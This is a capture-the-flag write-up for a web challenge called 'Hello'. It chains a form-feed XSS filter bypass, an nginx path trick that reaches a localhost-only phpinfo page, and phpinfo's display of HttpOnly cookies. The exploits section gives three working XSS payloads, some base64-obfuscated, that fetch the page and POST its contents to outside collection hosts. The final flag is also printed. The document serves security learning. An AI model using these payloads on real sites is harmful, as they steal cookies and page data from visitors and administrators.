# Hello
## Description
> Just to warm you up for the next Fight :"D <br><br>
> Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL <br>
> http://idek-hello.chal.idek.team:1337 <br>
> https://admin-bot.idek.team/idek-hello

![image](https://github.com/user-attachments/assets/4c597db2-e0bf-4ce0-be99-baaecaabdb46)

## Initial Analysis
1. ```index.php``` <br>

This file processes a ```name``` parameter from the query string and displays it. However, it uses an ```Enhanced_Trim``` function to strip certain characters (like spaces, slashes, etc.) from the input, which complicates crafting an XSS payload.
```php
function  Enhanced_Trim($inp) {
$trimmed = array("\r", "\n", "\t", "/", " ");
return  str_replace($trimmed, "", $inp);
}
```
However, by experimenting with different characters, I discovered that using ```%0C``` (form feed) as an alternative to a space character allows us to craft a working payload:

```html
<img%0Csrc=x%0Conerror=alert()>
```
2. ```info.php``` <br>

This file outputs the PHP configuration using phpinfo(), which includes all cookies sent with the request, even those with the HttpOnly flag. This is crucial, as the flag is stored in such a cookie.

3. ```nginx.conf``` <br>

A configuration rule restricts access to info.php to localhost only. However, a misconfiguration in the nginx.conf allows bypassing this restriction by appending a path to the URL (e.g., /info.php/index.php). https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm

4. ```bot.js```
The bot.js script:
- Launches a headless browser using Puppeteer.
- Visits the specified challenge origin as admin. (```localhost:1337```)
- Sets an HttpOnly cookie named FLAG. (can’t be accessed via ```document.Cookie```)
- Navigates to a target URL submitted by the user.
  
Our goal is to retrieve the flag by making the admin bot visit the info.php page and sending its content to our server.

## Solution

1. Bypassing the XSS Filter

Blacklist : ```\r```, ```\n```, ```\t```, ```/```, and ```spaces``` → %0c (form feed) can be used as a substitute for spaces

2. Bypassing the HttpOnly Flag

Access through ```info.php``` where ```phpinfo()``` can  displays PHP settings, including cookies—even those with HttpOnly set.

3. Bypassing Nginx Restrictions

To bypass the restriction, I utilized the ```/info.php/index.php``` path, which allows the bot to access the ```info.php``` page. The final step was crafting a payload to make the bot visit this page, capture the response, and send it to our server:

## Exploits

### 1. <img%0Csrc=x%0Conerror> x-www-form-urlencoded + %0c
```javascript
<img%0Csrc=x%0Conerror='fetch("info.php%252Findex.php")%0C.then(response%0C=>%0Cresponse.text())%0C.
then(data%0C=>%0Cfetch("https://idekctf.free.beeceptor.com/",%0C{method:"POST",%0Cheaders:{%0C"Content-Type":"application/x-www-form-urlencoded"},%0Cbody:"data="%0C%2BencodeURIComponent(data)})%0C)'>
```
### 2. <svg%0Conload> + json + base64 payload
- Original Payload
```javascript
fetch('http://idek-hello.chal.idek.team:1337/info.php/index.php').then(response => response.text()).then(data => {return fetch('https://idekctf.free.beeceptor.com', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({ content: data })});});
```
- Base64
```javascript
<svg%0Conload="eval(atob('base64-encoded-js-code'))">
```
```javascript
<svg%0Conload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9pZGVrLWhlbGxvLmNoYWwuaWRlay50ZWFtOjEzMzcvaW5mby5waHAvaW5kZXgucGhwJykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiB7cmV0dXJuIGZldGNoKCdodHRwczovL2lkZWtjdGYuZnJlZS5iZWVjZXB0b3IuY29tJywge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OiBKU09OLnN0cmluZ2lmeSh7IGNvbnRlbnQ6IGRhdGEgfSl9KTt9KTs='))">
```
### 3. <svg%0Conload> + raw + base64 payload (WebHook) 
```
fetch(atob('ChallengeURL as b64=')).then(r=>r.text()).then(e=>fetch(atob('<change me to webhook server as b64>'),{method:'POST',body:e})
```
```
<svg%0Conload="fetch(atob('aHR0cDovL2lkZWstaGVsbG8uY2hhbC5pZGVrLnRlYW06MTMzNy9pbmZvLnBocCUyZi5waHA=')).then(r=>r.text()).then(e=>fetch(atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvOWE0MDc2ZDUtNjg2Yi00YjYzLTkwYjAtY2E2ZGE4YWQ0Mjk5'),{method:'POST',body:e}))">
```
![image](https://github.com/user-attachments/assets/4c38331e-3956-4abd-9f02-a7daab638413)

## Final Steps
- XSS Trigger: The bot visits the crafted URL, triggering the XSS payload.
- Flag Extraction: The payload bypasses the HttpOnly restriction by accessing info.php and sending the flag to your server.
- Result: The flag was successfully retrieved: idek{Ghazy_N3gm_Elbalad}.
